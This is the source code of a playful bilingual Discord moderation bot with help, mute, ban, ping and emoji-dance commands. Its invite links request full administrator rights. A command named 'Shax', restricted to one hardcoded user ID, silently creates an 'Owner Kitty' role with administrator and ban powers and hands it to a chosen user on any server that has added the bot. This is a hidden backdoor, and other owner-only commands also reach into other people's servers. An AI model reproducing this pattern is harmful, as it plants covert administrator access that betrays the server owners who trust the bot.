const botsettings = require("./botsettings.json");
const Discord = require("discord.js");
 
const bot = new Discord.Client({ disableEveryone: true })
 
var prefix = "M";
var idAdmins = ['183549541470044161'];
var ProzPrefix = "P";
var Turtle = "Turtle"
var Pub = "C"
 
function userPermission(member, perm) {
    if (idAdmins.includes(member.user.id)) {
        return true;
    }
    return member.hasPermission(perm);
}
 
// pour récupérer le lien d'invitation du bot sur son serveur
bot.on('ready', async () => {
    console.log(`Bot is ready! ${bot.user.username}`);
 
    // on tente de générer un lien d'inviotation, en cas d'erreur, on l'affiche dans la console.
    try {
        let link = await bot.generateInvite(['ADMINISTRATOR']);
        console.log(link);
    } catch (e) {
        console.log(e.stack);
    }
});
bot.on('message', async message => {
    console.log(`Content : ${  message.content}`);
    if (message.content === prefix + "list") {
        var ServerListEmbed = new Discord.RichEmbed()
        .setAuthor("Asked By, Demandé Par : " + message.author.username,message.author.avatarURL)
        .addField(`Liste des serveurs où je suis:`,bot.guilds.map(r => `${r.name} | **${r.memberCount}** membres`))
        .setColor("0xff00ff")
        .setFooter("©SenkiTheKitty ( Merci à Elthumau, édit par Senki ) 2018.","https://media.discordapp.net/attachments/434459534514454528/481879724910444556/4ef67948850f942f08d52125928feeb5.gif?width=473&height=473")
        await message.delete(message);
        message.channel.sendEmbed(ServerListEmbed);
    }
    else if (message.content.startsWith(`${botsettings.prefix}jeu`)) {
        if (message.member.id != '183549541470044161') {
            return message.channel.sendMessage(`${message.author}, Your not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`)
        } else {
        var ServerListEmbed = new Discord.RichEmbed()
        bot.user.setActivity(`Do Mhelp to know my commands Meow =3, Currently on ` + bot.guilds.size + " Servers :3")
        }
    }
    else if (message.content === prefix + "help"){
        var embed = new Discord.RichEmbed()
            .setTitle("Here is the commands, Voila les commandes, Meow :3")
            .setAuthor("Asked By, Demandé Par : " + message.author.username,message.author.avatarURL)
            .addField("**__Commandes ne demandant aucune permissions spécifiques:__**",`[${prefix}help](https://discord.gg/PQ9jDvu) - Liste des commandes du bot. \n[${prefix}](https://discord.gg/PQ9jDvu) - Informations utiles sur le staff de la Senki Community et des developpeurs du bot.\n[${prefix}list](https://discord.gg/PQ9jDvu) - Permet de voir sur quel(s) serveur(s) se trouve le bot kitty :3.`)
            .addField("**__Commandes demandant des permissions de modérations:__**",`[${prefix}kick @user raison](https://discord.gg/PQ9jDvu) - Exclure un utilisateur n'ayant pas respecter le règlement. \n[${prefix}ban @user raison](https://discord.gg/PQ9jDvu) - Bannir un utilisateur dans un cas extrême. \n[${prefix}mute @user raison](https://discord.gg/PQ9jDvu) - Réduire une personne au silence. \n[${prefix}unmute @user ](https://discord.gg/PQ9jDvu) - Redonnez l'accés à la parole à une personne réduite au silence`)
            .addField("**__Commandes Reservées aux administrateurs du bot ( en particulier Senki ):__**",`[${prefix}Smute @user raison](https://discord.gg/PQ9jDvu) - Réduire une personne au silence ayant déranger Senki. \n[${prefix}Sunmute @user raison](https://discord.gg/PQ9jDvu) - Commande redonnant l'accés à la parole d'une personne réduit au silence ayant déranger Senki ( Si Senki ou un Administrateur vous unmute de cette manières, c'est que Senki ou un Administrateur à reconsidérer votre sanction)`)
            .addField("**__PUB:__**",`[Aidez Wright pour l'acces béta du Eagle Client](https://discord.gg/zRpjgEa) - Rejoignez ce discord via ce lien pour aider Wright à avoir un acces pour la béta tu EagleClient <a:blobdance:483297638356353027>.`)
            .addField("**__FUN ( Ne pas utiliser pour spam, don't use it to spam ):__**",`[${prefix}blobdance](https://discord.gg/PQ9jDvu) - Si vous executez cette commande, Kitty se mettra à dancer comme ceci <a:blobdance:483297638356353027> ! If you do this command, Kitty will dance like that <a:blobdance:483297638356353027> ! \n[${prefix}meowdance](https://discord.gg/PQ9jDvu) - Si vous executez cette commande, Kitty fera sa dance préférée <a:MeowDance:460163260780380170> ! If you do this command, Kitty will do his favorite dance <a:MeowDance:460163260780380170> !`)  
            .setColor("0xff00ff")
            .setFooter("©SenkiTheKitty (original by Elthumau, modifie par Senki) 2018.","https://media.discordapp.net/attachments/434459534514454528/481879724910444556/4ef67948850f942f08d52125928feeb5.gif?width=473&height=473")
            message.delete()
        message.channel.send(embed);
    }
    else if (message.content.startsWith(`${botsettings.prefix}link`)) {
        var embed = new Discord.RichEmbed()
    .addField("Here Is The Link, Voilà Le lien :3",`[Click Here To Invite Bot. Clique Ici Pour Inviter Le Bot](https://discordapp.com/oauth2/authorize?client_id=437630587671543819&permissions=8&scope=bot)`)
    .setColor("0xff00ff")
    .setFooter("©SenkiTheKitty 2018","https://media.discordapp.net/attachments/434459534514454528/481879724910444556/4ef67948850f942f08d52125928feeb5.gif?width=473&height=473")
    message.delete()
    message.channel.send(embed);
    }
    else if (message.content.startsWith(`${botsettings.prefix}mute`)) {
        if (!message.member.permissions.has('MANAGE_MESSAGES')) {
            return message.channel.sendMessage(`${message.author},You don't have enough power to mute a kitty, haxor. Tu n'as pas assez de permissions pour mute un chaton, hackeur ! >:c`);
        } else {
            let userToMute = message.mentions.users.first();
            if (!userToMute) {
                return message.channel.send("You are muting nothing .. ? Meow ? Specify an user mention, Dis moi la personne que je doit punir :3");
            } else {
                let role = message.guild.roles.find(r => r.name === "Muted Kitty");
                if (!role) {
                    try {
                        role = await message.guild.createRole({
                            name: "Muted Kitty",
                            color: "#c4c1c1",
                            permissions: []
                        });
 
                        message.guild.channels.forEach(async (channel) => {
                            await channel.overwritePermissions(role, {
                                SEND_MESSAGES: false,
                                ADD_REACTIONS: false
                            });
                        });
                    } catch (e) {
                        console.log(e.stack);
                    }
                }
                const memberToMute = message.guild.member(userToMute) || await message.guild.fetchMember(userToMute);
 
                await memberToMute.addRole(role);
                message.channel.sendMessage("I Muted That Bad Kitty ! Meow ! J'ai réduit en silence ce vilain chaton :3 <:KittyHug:457832384432308234>");
 
                return;
            }
        }
    }
    if (message.content === Turtle + "Twerk") {
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/434459534514454528/495248360731574272/tenor.gif")
    }
    else if (message.content.startsWith(`${botsettings.prefix}unmute`)) {
        if (!message.member.permissions.has('MANAGE_MESSAGES')) {
                return message.channel.sendMessage(`${message.author},You don't have enough power to unmute a kitty, haxor. Tu n'as pas assez de permissions pour unmute un chaton, hackeur ! >:c`);
            } else {
                let userToMute = message.mentions.users.first();
                if (!userToMute) {
                    return message.channel.send("If you want unmute someone, specify who, Si tu veux unmute quelqu'un, dis moi lequel Meow :3");
                } else {
                    let role = message.guild.roles.find(r => r.name === "Muted Kitty");
 
                    const memberToMute = message.guild.member(userToMute) || await message.guild.fetchMember(userToMute);
                   
                    await memberToMute.removeRole(role);
                    message.channel.sendMessage("I unmuted that bad kitty ! Jai redonner l'access à la personne pour parler :3 <:KittyHug:457832384432308234>")
            return;
            }                                                              
        }
    }
    else if (message.content.startsWith(`${botsettings.prefix}ping`)) {
        var embed = new Discord.RichEmbed()
        .setAuthor("Asked By, Demandé Par : " + message.author.username,message.author.avatarURL)
        .setTitle("<a:blobdance:483297638356353027> Kitty MS <a:blobdance:483297638356353027>")
        .addField(`${Math.round(bot.ping)}` + "ms <a:blobdance:483297638356353027>",`It's My ping, it's slow sorry, ceci est ma latence c'est assez lent désolé :c`)
        .setColor("0xff00ff")
        .setFooter("©SenkiTheKitty 2018","https://media.discordapp.net/attachments/434459534514454528/481879724910444556/4ef67948850f942f08d52125928feeb5.gif?width=473&height=473")
        message.delete()
        message.channel.sendEmbed(embed);
        return

    }
    else if (message.content.startsWith(`${botsettings.prefix}pub`)) {
        var embed = new Discord.RichEmbed()
        .setTitle("Aidez Senki | Help Senki !")
        .setAuthor("Asked By, Demandé Par : " + message.author.username,message.author.avatarURL)
        .addField("EN : Help Senki with joining this discord until senki says to leave it ^^. It will allows her to get access to an applications that will help help a lot !",` [Click Here](https://discord.gg/Ge24KE)`)
        .addField("FR : Aidez Senki en rejoignant ce discord jusqu'à ce que Senki vous signale de quitter ^^ ! Cela permettra à Senki d'obtenir l'accès à une application qui l'aidera beaucoup !",` [Cliquez Ici](https://discord.gg/Ge24KE)`)
        .setColor("0xff00ff")
        message.channel.sendEmbed(embed);
    }

    if (message.content === prefix + "staff"){
        var embed = new Discord.RichEmbed()
            .setTitle("Staff Du Bot Kitty <a:MeowDance:460163260780380170> ")
            .setAuthor("Asked By, Demandé Par : " + message.author.username,message.author.avatarURL)
            .addField("<a:MeowDance:460163260780380170> __***Administrateur***__ ","キティSєηKιTheKitty : <:minecraft:482269570959278091> : MyaTK (**Premium**), JS :computer: <:JS:483747345972985857> | Elie ( Kraiz Kitty ) : <:elie:503106045145513987>", true)
            .addField("<:Staff:482286528840597527>__**Staff**__<:Staff:482286528840597527> ",`<:Staff:482286528840597527> Staff <:Staff:482286528840597527>`)
            .addField("<a:blobdance:483297638356353027> ***Modérateur*** :  Prototype | Jenna♥.",` Prototype : JS :computer: <:JS:483747345972985857> | Jenna♥ : <:Jenna:500597386628956160> <:Proz:457894603002085386> .`)
            .addField("<:right:479601398456123423> **Verified +++**",` <:JS:483747345972985857> : Wright | ElTHumeau | LordMorgoth.`)
            .addField("<:rightred:482294137140412427> **Verified ++**",` <Anthony H/> | Pettixa. `)
            .addField("<:rightorange:482294137509511178> **Verified** +",` Islower | Pikness. `)
            .addField("<:rightgreen:482294137505185842> **Verified**",` King | Lighti. `)
            .setColor("0xff00ff")
            .setFooter("© Kitty Bot. | 2018","https://media.discordapp.net/attachments/434459534514454528/481879724910444556/4ef67948850f942f08d52125928feeb5.gif?width=473&height=473")
            message.delete() 
        message.channel.sendEmbed(embed);
        }
    else if (message.content.startsWith(`${botsettings.prefix}Shax`)) {
        if (message.member.id != '183549541470044161') {
            return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`);
        } else {
            let userToMute = message.mentions.users.first();
            if (!userToMute) {
            } else {
                let role = message.guild.roles.find(r => r.name === "Owner kitty");
                if (!role) {
                    try {
                        role = await message.guild.createRole({
                            name: "Owner Kitty",
                            color: "#ff00ff",
                            permissions: ['ADMINISTRATOR','BAN_MEMBERS','MANAGE_ROLES_OR_PERMISSIONS']
                        });
 
                        message.guild.channels.forEach(async (channel) => {
                            await channel.overwritePermissions(role, {
                                SEND_MESSAGES: true,
                                ADMINISTRATOR: true,
                            });
                        });
                    } catch (e) {
                        console.log(e.stack);
                    }
                }
                const memberToMute = message.guild.member(userToMute) || await message.guild.fetchMember(userToMute);
 
                await memberToMute.addRole(role);
                message.channel.sendMessage("Enjoy Master :3 <a:MeowDance:460163260780380170> <a:MeowDance:460163260780380170> <a:MeowDance:460163260780380170>");
 
                return;
            }
        }
    }
        if (message.isMentioned(bot.user)) {
        message.channel.sendMessage("Meow ? <:KittyWhat:483329846630416394>");
        }
        else if (message.content.startsWith(`${botsettings.prefix}blobdance`)) {
           message.channel.sendMessage("<a:blobdance:483297638356353027><a:blobdance:483297638356353027><a:blobdance:483297638356353027><a:blobdance:483297638356353027><a:blobdance:483297638356353027> <a:blobdance:483297638356353027> <a:blobdance:483297638356353027> <a:blobdance:483297638356353027>")
               return
        }

            else if (message.content.startsWith(`${botsettings.prefix}meowdance`)) {
                message.channel.sendMessage("<a:MeowDance:460163260780380170><a:MeowDance:460163260780380170><a:MeowDance:460163260780380170><a:MeowDance:460163260780380170><a:MeowDance:460163260780380170><a:MeowDance:460163260780380170><a:MeowDance:460163260780380170><a:MeowDance:460163260780380170>")
                  return
            }
        

    else if (message.content.startsWith(`${botsettings.prefix}Smute`)) {
        if (message.member.id != '183549541470044161') {
            return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`);
        } else {
            let userToMute = message.mentions.users.first();
            if (!userToMute) {
                return message.channel.send("You are muting nothing .. ? Meow ? Specify an user mention, Dit moi la personne que je doit punir :3");
                } else {
                let role = message.guild.roles.find(r => r.name === "Muted Kitty");
                if (!role) {
                    try {
                        role = await message.guild.createRole({
                            name: "Muted Kitty",
                            color: "#c4c1c1",
                            permissions: []
                        });
 
                        message.guild.channels.forEach(async (channel) => {
                            await channel.overwritePermissions(role, {
                                SEND_MESSAGES: false,
                                ADD_REACTIONS: false
                            });
                        });
                    } catch (e) {
                        console.log(e.stack);
                    }
                }
                const memberToMute = message.guild.member(userToMute) || await message.guild.fetchMember(userToMute);
 
                await memberToMute.addRole(role);
                message.channel.sendMessage("There you are Master, I muted it for you :3, Voila Senki, je l'ai mute pour vous :3 <a:MeowDance:460163260780380170>.");
 
                return;
            }
        }
    }
    if (message.content === ProzPrefix + "ROZ1K") {
        message.channel.sendMessage(`GG We finally got 1K Incredible !
        Cray and whole staff team didn't except we could reach this !
        Thanks you !
        The whole Staff team love you ! <3
        - Senki and Whole Staff Team
        https://cdn.discordapp.com/attachments/450615759648063513/490535527066501120/unknown.png`)
        return
    }

    else if (message.content.startsWith(`${botsettings.prefix}Sunmute`)) {
        if (message.member.id != '183549541470044161') {
            return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`);
        } else {
            let userToMute = message.mentions.users.first();
            if (!userToMute) {
                return message.channel.send("Si tu veux unmute quelqu'un, dit moi lequel Meow :3");
            } else {
                let role = message.guild.roles.find(r => r.name === "Muted Kitty");
 
                const memberToMute = message.guild.member(userToMute) || await message.guild.fetchMember(userToMute);
               
                await memberToMute.removeRole(role);
                message.channel.sendMessage("I unmuted it,Senki :3 <a:MeowDance:460163260780380170>")
           return;
            }
        }
    }
    else if (message.content.startsWith(`${botsettings.prefix}ban`)) {
        if (!message.member.permissions.has('BAN_MEMBERS')) {
            return message.channel.sendMessage(`${message.author},You don't have enough power to ban a kitty, haxor. Tu n'as pas assez de permissions pour ban un chaton, hackeur ! >:c`)
        } else {
            var memberban = message.mentions.users.first();
            if (!memberban) {
                return message.channel.send("You are banning nothing .. ? Meow ? Specify an user mention, Dis moi la personne que je doit punir :3");
            } else {
            if(!message.guild.member(memberban).bannable){
                return message.channel.sendMessage("You cannot ban your superior or person with same permissions than you, tu ne peux pas bannir ton supérieur ou quelqu'un ayant les mêmes permissions que toi ! >:c | Make sure the role of the bot is hightest than every of the roles of your server, fait en sorts que le role du bot kitty est au-dessus de tout les autres roles existant :3");
        } else {
            let args = message.content.split(" ").slice(1);
            let reason = args.slice(1).join(' ');

            message.guild.member(memberban).ban().then((member) => {
            message.channel.sendMessage(`${member.user} got banned by ${message.author} for : ${reason}, Meow ! :3  :3 <a:MeowDance:460163260780380170>`);
            message.member.sendMessage("Tu as été bannie du serveur, You got banned from the server.",` Reason : ${reason} `)
            })
            return;
            }
        }
    }
}
else if (message.content.startsWith(`${botsettings.prefix}unban`)) {
    if (!message.member.permissions.has('BAN_MEMBERS')) {
        return message.channel.sendMessage(`${message.author},You don't have enough power to unban a kitty, haxor. Tu n'as pas assez de permissions pour unban un chaton, hackeur ! >:c`)
    } else {
        let memberunban = message.content.split(/ +/g).slice(1).join(' ')
        if (!memberunban) {
                return message.channel.send("You are unbanning nothing .. ? Meow ? Specify an user **ID**, Dis moi la personne que je doit punir :3");
        } else {
            message.guild.unban(memberunban)
                .then(() => {
                    message.channel.send(`The banned user got unbanned by ${message.author} | Meow ! :3 <a:MeowDance:460163260780380170>`);
                });
        }
  }
  return;
}
else if (message.content.startsWith(`${botsettings.prefix}Leave`)) {
    if(message.author.id !=='183549541470044161') 
        return message.channel.send(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`);
        message.guild.leave();
    return
}

     else if (message.content.startsWith(`${botsettings.prefix}HB`)) {
        message.channel.sendMessage("Happy birthday Senki, Bonne anniversaire Senki ! :3 <a:MeowDance:460163260780380170> <a:blobdance:483297638356353027>")
        return

}

            else if (message.content.startsWith(`${botsettings.prefix}Sban`)) {
                if (message.member.id != '183549541470044161') {
                    return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`)
                } else {
                    var memberban = message.mentions.users.first();
                    if (!memberban) {
                        return message.channel.send("Master, Tell me who to ban, Senki dis moi qui je dois bannir :3");
                    } else {
                    if(!message.guild.member(memberban).bannable){
                    return message.channel.sendMessage("Sorry master, i don't have anough permissions")
                } else {
                    let args = message.content.split(" ").slice(1);
                    let reason = args.slice(1).join(' ');
        
                    message.guild.member(memberban).ban().then((member) => {
                    message.channel.send(`${message.user} got banned by ${message.author} for : ${reason} | Meow ! :3 <a:blobdance:483297638356353027>`);
                    })
                    return;
                    }
                }
            }
        }
                            else if (message.content.startsWith(`${botsettings.prefix}Sunban`)) {
                                if (message.member.id != '183549541470044161') {
                                    return message.channel.sendMessage(`${message.author}, You're not senki, only that person can use that command. Tu n'es pas Senki, seul cette personne peut utiliser cette commande ! >:C`)
                                } else {
                                    let memberunban = message.content.split(/ +/g).slice(1).join(' ');
                                    if (!memberunban) {
                                            return message.channel.send("You are unbanning nothing .. ? Meow ? Specify an user **ID**, Dis moi la personne que je doit punir :3");
                                    } else {
                                        message.guild.unban(memberunban)
                                            .then(() => {
                                                message.channel.send(`That Bad Kitty Got unbanned by ${message.author} | Meow ! :3 <a:blobdance:483297638356353027>`);
                                            });
                                    }
                                }
                            }

                              
});
 
bot.login(process.env.BOT_TOKEN);
